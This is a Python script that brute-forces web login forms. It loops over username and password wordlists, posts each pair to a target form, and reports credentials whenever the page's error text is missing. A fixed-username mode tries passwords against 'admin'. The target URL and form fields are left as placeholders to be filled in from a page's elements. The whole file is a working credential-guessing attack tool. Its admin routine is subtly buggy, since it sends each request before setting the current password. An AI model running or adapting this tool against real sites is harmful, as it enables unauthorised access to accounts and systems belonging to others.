import requests
import sys


class BruteForce:
    def __init__(self, full_target_url, action, method, username_name, password_name, submit_name, submit_value, error_value):
        self.url = full_target_url.rstrip("/")
        self.action = action
        self.method = method
        self.username_name = username_name
        self.password_name = password_name
        self.submit_name = submit_name
        self.submit_value = submit_value
        self.error_value = error_value
        self.data_dict = {username_name: "", self.password_name: "", self.submit_name: self.submit_value}
        self.check_url(self.url)

    def check_url(self, url):
        try:
            response = requests.get(url=url, timeout=3)
            response.raise_for_status()
            # self.brute_force_all(self.url, self.action, self.method)  # Check for all usernames
            self.brute_force_admin(self.url, self.action, self.method)  # Only check for "admin"
        except requests.exceptions.RequestException as e:
            print("[-] Failed to connect with the target URL: ", e)
            sys.exit(1)

    def brute_force_all(self, url, action, method):
        if action not in url:
            url += f"/{action}/"

        try:
            with open("usernames.txt", "r") as usernames_wordlist, open("passwords.txt", "r") as passwords_wordlist:
                for username in usernames_wordlist:
                    username = username.strip()
                    sys.stdout.write(f"\rTrying passwords for: {username.strip()}")  # Update print statement
                    sys.stdout.flush()
                    passwords_wordlist.seek(0)
                    for password in passwords_wordlist:
                        password = password.strip()
                        self.data_dict[self.username_name] = username
                        self.data_dict[self.password_name] = password
                        response = requests.request(method, url, data=self.data_dict)
                        if self.error_value not in response.text:
                            print(f"\n[+] Username: {username} | Password: {password}\n")
                            break
        except KeyboardInterrupt:
            print("\n[-] Exited")
            sys.exit(0)
        except Exception as e:
            print("An error occurred: ", e)
            sys.exit(1)

    def brute_force_admin(self, url, action, method):
        if action not in url:
            url += f"/{action}/"

        try:
            with open("passwords.txt", "r") as passwords_wordlist:
                for password in passwords_wordlist:
                    password = password.strip()
                    response = requests.request(method, url, data=self.data_dict)
                    self.data_dict[self.username_name] = "admin"
                    self.data_dict[self.password_name] = password
                    if self.error_value not in response.text:
                        print(f"\n[+] Username: admin | Password: {password}\n")
        except KeyboardInterrupt:
            print("\n[-] Exited")
            sys.exit(0)
        except Exception as e:
            print("An error occurred: ", e)
            sys.exit(1)


# Get values from inspecting elements
if __name__ == "__main__":
    brute_forcer = BruteForce(
        full_target_url="[Target URL]",
        action="[VALUE]",
        method="[VALUE]",
        username_name="[VALUE]",
        password_name="[VALUE]",
        submit_name="[VALUE]",
        submit_value="[VALUE]",
        error_value="[VALUE]"
    )
